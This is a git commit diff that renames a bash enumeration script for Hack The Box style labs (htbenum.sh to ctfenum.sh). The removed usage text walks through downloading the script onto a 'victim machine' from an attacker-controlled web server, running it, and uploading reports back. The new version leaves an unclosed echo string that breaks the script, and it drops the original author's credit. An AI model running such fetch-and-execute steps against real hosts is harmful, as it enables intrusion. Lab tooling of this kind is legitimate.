220fc46970c2cb98313897890cffeca042a7aefa
nickkilla <nickkilla@users.noreply.github.com>
2020-01-02 23:48:42 -0600

    Update and rename htbenum.sh to ctfenum.sh

--- ctfenum.sh
+++ ctfenum.sh
@@ -1,11 +1,5 @@
 #!/bin/bash
 
-# TODO
-# - make an interactive option
-# - make adding/running tools modular:
-# - add web server feature
-# - upload reports back to host box 
-
 # Colors
 NC='\033[0m'
 RED='\033[0;31m'
@@ -21,30 +15,12 @@ function banner () {
 	echo "|  _  | | | | ___ \  __|| . \` | | | | |\/| |";
 	echo "| | | | | | | |_/ / |___| |\  | |_| | |  | |";
 	echo "\_| |_/ \_/ \____/\____/\_| \_/\___/\_|  |_/";
-	echo -e "\n${ORANGE}By Solomon Sklash - solomonsklash@0xfeed.io ${NC}\n";
 }
 
 function usage () {
 		echo -e "${GREEN} Usage:";
-		echo -e "${GREEN}         ./htbenum.sh [-u] -i IP -p port [-o directory] [-w] [-r]\n";
-		echo -e "${GREEN}         htbenum is designed do Linux enumeration in environments like Hack The Box where ";
-		echo -e "${GREEN}         you do not have direct Internet access to download scripts and tools.\n";
-		echo -e "${GREEN}         It will download enumeration and exploit suggestion scripts to a Linux host and ";
-		echo -e "${GREEN}         automatically execute them, providing a saved text report for each tool, and ";
-		echo -e "${GREEN}         optionally upload the reports back top the host machine. Simply upload htbenum.sh ";
-		echo -e "${GREEN}         to a host, run with the IP and port of the builtin web server hosting the tools ";
-		echo -e "${GREEN}         (or use your own), and they will be downloaded to /tmp (or an optional user-defined ";
-		echo -e "${GREEN}         directory) and executed, with report output being saved to /tmp or a custom directory.";
-		echo -e "${GREEN}         The reports can also optionally be uploaded back to your host machine.\n";
-		echo -e "${GREEN}         Note: Before running this tool on the target host, make sure to run it locally with ";
-		echo -e "${GREEN}         the update parameter in order to download all the necessary tools to the current ";
-		echo -e "${GREEN}         directory. Then start the builtin web server to host the tools and receive the reports.\n ";
-		echo -e "${GREEN} Example:";
-		echo -e "${GREEN}         Host machine: root@kali:~/htbenum# ./htbenum.sh -u";
-		echo -e "${GREEN}         Host machine: root@kali:~/htbenum# ./htbenum.sh -i 10.10.14.1 -p 80 -w";
-		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ wget http://10.10.14.1:80/htbenum.sh";
-		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ chmod +x ./htbenum.sh";
-		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ ./htbenum.sh -i 10.10.14.1 -p 80 -r\n";
+		echo -e "${GREEN}         ./ctfenum.sh [-u] -i IP -p port [-o directory] [-w] [-r]\n";
+		echo -e "${GREEN}         
 		echo -e "${GREEN} Parameters:";
 		echo -e "${GREEN}         -h - View help and usage.";
 		echo -e "${GREEN}         -i IP - IP address of the listening web server used for upload and download.";
